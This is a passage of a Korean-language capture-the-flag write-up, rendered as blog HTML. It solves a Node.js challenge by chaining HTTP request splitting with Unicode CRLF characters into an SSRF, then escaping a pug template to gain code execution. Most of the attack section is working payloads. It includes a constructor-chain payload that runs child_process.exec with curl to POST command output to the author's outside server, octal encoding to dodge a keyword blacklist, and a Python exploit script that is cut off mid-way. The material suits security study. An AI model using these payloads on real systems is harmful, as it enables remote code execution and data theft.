class=\"mtk1\">  </span><span class=\"mtk10\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&lt;</span><span class=\"mtk1\"> </span><span class=\"mtk4\">arrayLen</span><span class=\"mtk1\">; </span><span class=\"mtk4\">i</span><span class=\"mtk8\">++</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">const</span><span class=\"mtk1\"> </span><span class=\"mtk11\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">url</span><span class=\"mtk1\">.</span><span class=\"mtk3\">includes</span><span class=\"mtk1\">(</span><span class=\"mtk4\">evilwords</span><span class=\"mtk1\">[</span><span class=\"mtk4\">i</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk7\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">server</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">listen</span><span class=\"mtk1\">(</span><span class=\"mtk7\">8081</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">host</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">server</span><span class=\"mtk1\">.</span><span class=\"mtk3\">address</span><span class=\"mtk1\">().</span><span class=\"mtk4\">address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">port</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">server</span><span class=\"mtk1\">.</span><span class=\"mtk3\">address</span><span class=\"mtk1\">().</span><span class=\"mtk4\">port</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;Example app listening at http://%s:%s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">host</span><span class=\"mtk1\">, </span><span class=\"mtk4\">port</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p>ì—¬ê¸°ì„œ ë³´ë©´ flagì— ì ‘ê·¼ì„ í•´ì•¼ í•˜ëŠ”ë° ì¼ë‹¨ localhostì—ì„œ ì ‘ê·¼ì„ í•´ì•¼ í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>\n<p>ì´ë•Œ <code>req.connection.remoteAddress;</code> ì„ í†µí•´ ë°›ê³  ìˆê¸° ë•Œë¬¸ì— <code>x-forwarded-for</code> ì™€ ê°™ì€ í—¤ë”ë¡œëŠ” ê³µê²©ì´ ë¶ˆê°€ëŠ¥í•œ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\">//node 8.12.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&#39;/core&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk11\">query</span><span class=\"mtk1\">.</span><span class=\"mtk4\">q</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">resp</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">q</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">url</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;http://localhost:8081/getMeme?&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span></span></span></code></pre>\n<p>sourceì—ì„œ ë³´ì´ëŠ” ì£¼ì„ì—ì„œ ì•Œë ¤ ì£¼ëŠ” nodejs ë²„ì „ê³¼ /coreì—ì„œ ë°›ì•„ ë“¤ì´ëŠ” q= íŒŒë¼ë¯¸í„°ì—ì„œ url parse ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ssrfê°€ ê°€ëŠ¥í•´ ë³´ì…ë‹ˆë‹¤.</p>\n<blockquote>\n<h4 id=\"ì°¸ê³ ---http-request-splitting-ssrf-via-request-splitting--ìœ ë‹ˆì½”ë“œ-ì •ë³´\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EA%B3%A0---http-request-splitting-ssrf-via-request-splitting--%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EC%A0%95%EB%B3%B4\" aria-label=\"ì°¸ê³    http request splitting ssrf via request splitting  ìœ ë‹ˆì½”ë“œ ì •ë³´ permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://capec.mitre.org/data/definitions/105.html\">ì°¸ê³  - HTTP Request Splitting</a>, <a href=\"https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/\">SSRF via Request Splitting</a> , <a href=\"https://en.wikipedia.org/wiki/List_of_Unicode_characters\">ìœ ë‹ˆì½”ë“œ ì •ë³´</a></h4>\n<p>HTTP Requestì— double CR/LF charactersìœ¼ë¡œ ë³€í™˜ë˜ëŠ” ìœ ë‹ˆì½”ë“œë¥¼ url í¬ë§·ì— ë§ì¶° (</p>\n<p>%C4%8D%C4%8A)ë¥¼ HTTP headerì— ë„£ìŒìœ¼ë¡œ requestì„ split! í•©ë‹ˆë‹¤.</p>\n</blockquote>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">http://27.96.135.144:8081/core?q=test%C4%A0HTTP%2F1.1%C4%8D%C4%8AHOST%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Fflag%C4%A0HTTP%2F1.1%C4%8D%C4%8AHOST%3A%C4%A0127.0.0.1%C4%8D%C4%8Aadminauth%3A%C4%A0secretpassword%C4%8D%C4%8Apug%3A%C4%A0123%C4%8D%C4%8Atest%3A</span></span></code></pre>\n<p>ì´ì œ ì„œë²„ì—ì„œëŠ” urlì´ ì´ëŸ° í˜•íƒœë¡œ parse ì‹œì¼œì„œ ì´í•´ í•˜ê²Œ ë©ë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"http\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">GET /core?q=test HTTP/1.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">HOST: 127.0.0.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">GET /flag HTTP/1.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">HOST: 127.0.0.1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">adminauth: secretpassword</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pug: 123</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">test: ~~~~ ì›ë˜ ì „ë‹¬ ë˜ì•¼ í•˜ëŠ” requestë¥¼ testì˜ í—¤ë”ë¡œ ë¬´ì‹œ</span></span></code></pre>\n<p>ê·¸ë¦¬ê³  ì‹¤ì œë¡œ ì„œë²„ì—ì„œ ì´ëŸ° í˜•íƒœë¡œ ë¡œê·¸ë¥¼ ë³´ì—¬ ì£¼ëŠ” ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 1200px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMklEQVQI12OwtjRVV1fX1NTU0tLS0NBQVVVVBgIlFWUlZRUwUIYAJWWgFEQEwlBSUgIAGOoI04aqDCgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"M9dhQS2RyAkV9kx6VLMEpkimg\"\n        title=\"M9dhQS2RyAkV9kx6VLMEpkimg\"\n        src=\"/static/989ea6acbf25d260fca30822c1b3d046/c1b63/M9dhQS2RyAkV9kx6VLMEpkimg.png\"\n        srcset=\"/static/989ea6acbf25d260fca30822c1b3d046/5a46d/M9dhQS2RyAkV9kx6VLMEpkimg.png 300w,\n/static/989ea6acbf25d260fca30822c1b3d046/0a47e/M9dhQS2RyAkV9kx6VLMEpkimg.png 600w,\n/static/989ea6acbf25d260fca30822c1b3d046/c1b63/M9dhQS2RyAkV9kx6VLMEpkimg.png 1200w,\n/static/989ea6acbf25d260fca30822c1b3d046/f470a/M9dhQS2RyAkV9kx6VLMEpkimg.png 1443w\"\n        sizes=\"(max-width: 1200px) 100vw, 1200px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>ì´ì œ flag ìª½ ì†ŒìŠ¤ë¥¼ ë¶„ì„ í•©ë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/flag&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">ip</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connection</span><span class=\"mtk1\">.</span><span class=\"mtk4\">remoteAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ip</span><span class=\"mtk1\">.</span><span class=\"mtk3\">includes</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;127.0.0.1&quot;</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;adminauth&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug2</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">decodeURI</span><span class=\"mtk1\">(</span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;pug&quot;</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">x</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pug2</span><span class=\"mtk1\">.</span><span class=\"mtk3\">match</span><span class=\"mtk1\">(</span><span class=\"mtk6\">/</span><span class=\"mtk7\">[a-z]</span><span class=\"mtk6\">/</span><span class=\"mtk10\">g</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk8\">!</span><span class=\"mtk4\">x</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;secretpassword&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">html</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pug</span><span class=\"mtk1\">.</span><span class=\"mtk3\">render</span><span class=\"mtk1\">(</span><span class=\"mtk4\">pug2</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;No characters&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;You need to come from localhost&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span></code></pre>\n<p>ì¼ë‹¨ ì²« ë²ˆì§¸ ì¡°ê±´ì¸ ì ‘ê·¼ IPê°€ 127.0.0.1 ì´ì—¬ì•¼ í•œë‹¤ëŠ” ì  ê·¸ë¦¬ê³  adminauth: secretpassword í˜•íƒœì˜ headerê°€ ë‹¬ë ¤ìˆì–´ì•¼ í•œë‹¤ëŠ” ë‘ ê°€ì§€ ì¡°ê±´ì€ í•´ê²°ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</p>\n<p>ì´ì œ pugí—¤ë”ì— ì˜ë¬¸ì´ ì—†ì–´ì•¼ í•˜ê³  ì´ê²ƒì´ ì§€ì¼œ ì¡Œì„ ë•Œ pugë¥¼ ì´ìš©í•˜ì—¬ ë Œë”ë§ì„ ì‹œì¼œ ì£¼ê²Œ ë˜ëŠ”ë° ì¼ë‹¨ pugê°€ ë¬´ì—‡ ì¸ì§€ ì°¾ì•„ ë´…ë‹ˆë‹¤.</p>\n<blockquote>\n<h1 id=\"code\" style=\"position:relative;\"><a href=\"#code\" aria-label=\"code permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code</h1>\n<p>Pug allows you to write inline JavaScript code in your templates. There are three types of code: Unbuffered, Buffered, and Unescaped Buffered.</p>\n</blockquote>\n<p>javascriptì™€ pug ë¬¸ë²•ì„ ì´ìš©í•˜ì—¬ ê°„ê²°í•˜ê²Œ htmlì„ ë Œë”ë§ í•˜ê²Œ ë„ì™€ì£¼ëŠ” ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. ì´ë•Œ jsë¥¼ ì´ìš©í•˜ì—¬ ë Œë”ë§ í•œë‹¤ëŠ” ê²ƒì„ ì´ìš©í•˜ì—¬ ê³µê²©ì„ í•´ë´…ë‹ˆë‹¤.</p>\n<p>ë˜í•œ blackList ì²´í¬ í•­ëª©ì— ìˆëŠ” <strong>[\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\"\",\"'\",\"!\"]</strong> ì„ ì´ìš©í•˜ì—¬ ê³µê²©ì„ í•˜ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">-[][&quot;constructor&quot;][&quot;constructor&quot;](&quot;console.log(this.process.mainModule.require(&#39;child_process&#39;).exec(&#39;curl http://devjs.cf:8089/cookie.php -X POST -d c=`ls | grep flag` &#39;))&quot;)()</span></span></code></pre>\n<p>ëŒ€ëµ ì´ëŸ°í˜•íƒœë¡œ ë‚´ê°€ ì›í•˜ëŠ” ëª…ë ¹ì–´ë¥¼ ë³´ë‚´ê³  ê·¸ë‹¤ìŒ ì„œë²„ì—ì„œ ë‹¤ì‹œí•œë²ˆ ì²˜ë¦¬ë¥¼ í•˜ê³  ì €ì˜ ì„œë²„ë¡œ ì „ì†¡í•˜ë„ë¡ í•˜ì˜€ìŠµë‹ˆë‹¤.</p>\n<p>ì´ì œ ìš°íšŒë¥¼ ì‹œí‚¤ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•©ë‹ˆë‹¤.</p>\n<p>ì¼ë‹¨ pug í—¤ë”ì— ë‹´ê¸´ ê³µê²© payloadê°€ ì˜ë¬¸ ì†Œë¬¸ìê°€ í¬í•¨ì´ ë˜ì—ˆëŠ”ì§€ í™•ì¸ í•˜ëŠ” ë£¨í‹´ì´ ìˆëŠ”ë° ì´ê²ƒì€ 8ì§„ë²•ìœ¼ë¡œ ë³€í™˜í•˜ì—¬ ìš°íšŒí•´ë´…ë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">changeOct</span><span class=\"mtk1\">(</span><span class=\"mtk4\">str</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">r</span><span class=\"mtk8\">=</span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">for</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> str:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk8\">&gt;=</span><span class=\"mtk6\">&#39;a&#39;</span><span class=\"mtk4\">and</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk8\">&lt;=</span><span class=\"mtk6\">&#39;z&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk8\">+=</span><span class=\"mtk6\">&#39;</span><span class=\"mtk8\">\\\\</span><span class=\"mtk6\">&#39;</span><span class=\"mtk8\">+</span><span class=\"mtk3\">oct</span><span class=\"mtk1\">(</span><span class=\"mtk3\">ord</span><span class=\"mtk1\">(</span><span class=\"mtk4\">i</span><span class=\"mtk1\">))[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">:]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">else</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk8\">+=</span><span class=\"mtk4\">i</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">r</span></span></span></code></pre>\n<p>ê·¸ë¦¬ê³  ì´ì œ payload ë¶€ë¶„ì„ ì‰½ê²Œ ì œì‘ í•  ìˆ˜ ìˆë„ë¡ ìš°íšŒ ë¬¸ìë¥¼ ìƒìˆ˜ë¡œ ì„ ì–¸í•˜ì—¬ ì‘ì„±í•©ë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">SPACE = &quot;Ä &quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">CRLF = &quot;ÄÄŠ&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">SLASH = &quot;Ä¯&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">payload = &quot;test&quot;+SPACE+&quot;HTTP&quot;+SLASH+&quot;1.1&quot;+CRLF*2+&quot;GET&quot;+SPACE+SLASH+&quot;flag&quot;+SPACE+&quot;HTTP&quot;+SLASH+&quot;1.1&quot;+CRLF+&quot;HOST:&quot;+SPACE+&quot;127.0.0.1&quot;+CRLF+&quot;adminauth:&quot;+SPACE+&quot;secretpassword&quot;+CRLF+&quot;pug:&quot;+SPACE+ê³µê²© PUG ê°’ì´ ë“¤ì–´ì˜¬ ìë¦¬+CRLF+&quot;test:&quot;+SPACE</span></span></code></pre>\n<p>ì´ì œ ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê²°í•©í•˜ì—¬ ì¼ë‹¨ í˜„ì¬ ê²½ë¡œì— ë¬´ì—‡ì´ ìˆëŠ”ì§€ í™•ì¸ í•´ë´…ë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">import</span><span class=\"mtk1\"> </span><span class=\"mtk4\">requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">from</span><span class=\"mtk1\"> </span><span class=\"mtk4\">requests</span><span class=\"mtk1\">.</span><span class=\"mtk4\">utils</span><span class=\"mtk1\"> </span><span class=\"mtk4\">import</span><span class=\"mtk1\"> </span><span class=\"mtk4\">quote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">def</span><span class=\"mtk1\"> </span><span class=\"mtk4\">changeOct</span><span class=\"mtk1\">(</span><span class=\"mtk4\">str</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">r</span><span class=\"mtk1\">=</span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">for</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk4\">str</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\">&gt;=</span><span class=\"mtk6\">&#39;a&#39;</span><span class=\"mtk4\">and</span><span class=\"mtk1\"> </span><span class=\"mtk4\">i</span><span class=\"mtk1\">&lt;=</span><span class=\"mtk6\">&#39;z&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">r</span><span class=\"mtk1\">+=</span><span class=\"mtk6\">&#39;</span><span class=\"mtk8\">\\\\</span><span class=\"mtk6\">&#39;</span><span class=\"mtk1\">+</span><span class=\"mtk4\">oct</span><span class=\"mtk1\">(</span><span class=\"mtk4\">ord</span><span class=\"mtk1\">(</span><span class=\"mtk4\">i</span><span class=\"mtk1\">))[2:]</span></span></span>\n<span 